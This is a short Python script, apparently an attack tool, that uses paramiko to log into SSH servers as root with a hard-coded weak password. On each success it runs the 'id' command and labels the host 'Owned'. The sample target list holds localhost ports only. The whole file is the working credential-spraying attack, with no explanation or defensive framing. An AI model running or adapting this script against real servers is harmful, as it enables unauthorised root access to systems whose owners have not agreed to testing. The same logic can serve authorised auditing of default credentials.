import paramiko

username='root'
password='Passwords'
cmd='id'

def check(ip, port):
	try:
		ssh=paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip,port,username,password)
		stdin,stdout,stderr=ssh.exec_command(cmd)
		outlines=stdout.readlines()
		resp=''.join(outlines)
		if resp:
			if "\n" in resp:
				resp = resp.replace("\n","")
			print(ip+" - \033[32;1mOwned\033[0m")
			print("\033[32mStdout:\033[0m "+str(resp)+"\n")
	except:
		print(ip+" - \033[31mFailed\033[0m")

listip = """127.0.0.1:22
127.0.0.1:2022
127.0.0.1:3752"""
for ip in listip.splitlines():
	spl = ip.split(":")
	ip = spl[0]
	port = spl[1]
	check(ip, port)
